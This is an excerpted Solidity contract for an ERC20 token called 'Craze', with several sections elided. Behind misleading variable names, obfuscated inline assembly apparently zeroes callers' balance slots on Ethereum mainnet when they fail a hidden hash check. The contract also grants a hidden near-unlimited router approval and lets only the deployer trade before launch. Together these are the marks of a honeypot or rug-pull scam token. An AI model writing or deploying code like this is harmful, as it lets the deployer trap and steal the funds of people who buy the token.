...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCraze;
    uint256 private phaseTransition = block.number*2;

    mapping (address => bool) private _firstWave; 
    mapping (address => bool) private _secondSign;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private theSign;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private youHave;
    address public pair;
    ...
    bool private trading; uint256 private beenLooking = 1; bool private forOk;
    uint256 private _decimals; uint256 private fallsAngel;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCraze.push(_router); addCraze.push(msgSender_); addCraze.push(pair);
        for (uint256 q=0; q < 3;) {_firstWave[addCraze[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xaf84fd1d849725d7451703aa782d96beaaf5e176363d9ab960c87052ae3c24bb
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x56f3fbfbc6abe20e95ad8b154f28495ee97f341ddcedd23b30b9ba692275c754,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; phaseTransition = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCraze[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCraze(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCraze[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCraze(creator, initialSupply);
    }
}

contract Craze is ERC20Token {
    constructor() ERC20Token("Craze", "CRAZE", msg.sender, 25000000 * 10 ** 18) {
    }
}